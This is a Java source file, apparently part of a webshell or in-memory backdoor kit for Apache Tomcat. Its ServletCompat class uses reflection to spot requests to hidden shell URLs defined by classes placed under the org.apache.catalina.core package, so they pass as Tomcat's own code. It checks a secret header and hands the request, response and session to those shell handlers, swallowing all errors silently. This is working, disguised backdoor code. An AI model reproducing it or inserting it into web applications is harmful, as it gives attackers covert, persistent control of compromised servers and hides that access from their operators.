package indi.augusttheodor.stage;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class ServletCompat {

    public static String AUTH_KEY = null;
    public static String AUTH_VALUE = null;

    public static Map handle(Object request, Object response) {
        try {
            String url = (String) invoke(request, "getServletPath");
            if (url == null || !isShellUrl(url)) {
                return null;
            }
            if (AUTH_KEY != null) {
                String h = getHeader(request, AUTH_KEY);
                if (h == null ? AUTH_VALUE != null : !h.equals(AUTH_VALUE)) {
                    return null;
                }
            }
            Map s = new HashMap();
            Map rdd = new HashMap();
            rdd.put("url", url);
            rdd.put("method", invoke(request, "getMethod"));
            Object reader = invoke(request, "getReader");
            rdd.put("b", reader == null ? null : reader.getClass().getMethod("readLine").invoke(reader));
            s.put("rdd", rdd);
            s.put("request", request);
            s.put("response", response);
            s.put("session", getSession(request));
            return s;
        } catch (Throwable t) {
            return null;
        }
    }

    private static boolean isShellUrl(String url) {
        return url.matches("/(.*)" + org.apache.catalina.core.RebeyondServices.SERVICE_URL)
                || url.matches("/(.*)" + org.apache.catalina.core.ExtendServices.SERVICE_URL)
                || url.matches("/(.*)" + org.apache.catalina.core.NeoServices.SERVICE_URL);
    }

    public static Map getRdd(Object s) {
        return (Map) ((Map) s).get("rdd");
    }

    public static Object getSession(Object request) throws Exception {
        return invoke(request, "getSession");
    }

    public static String getHeader(Object request, String name) throws Exception {
        return (String) invoke(request, "getHeader", name);
    }

    private static Object invoke(Object target, String method, Object... args) throws Exception {
        Method m = target.getClass().getMethod(method, types(args));
        return m.invoke(target, args);
    }

    private static Class<?>[] types(Object[] args) {
        if (args == null || args.length == 0) {
            return new Class[0];
        }
        Class<?>[] ts = new Class[args.length];
        for (int i = 0; i < args.length; i++) {
            ts[i] = args[i] == null ? Object.class : args[i].getClass();
        }
        return ts;
    }
}
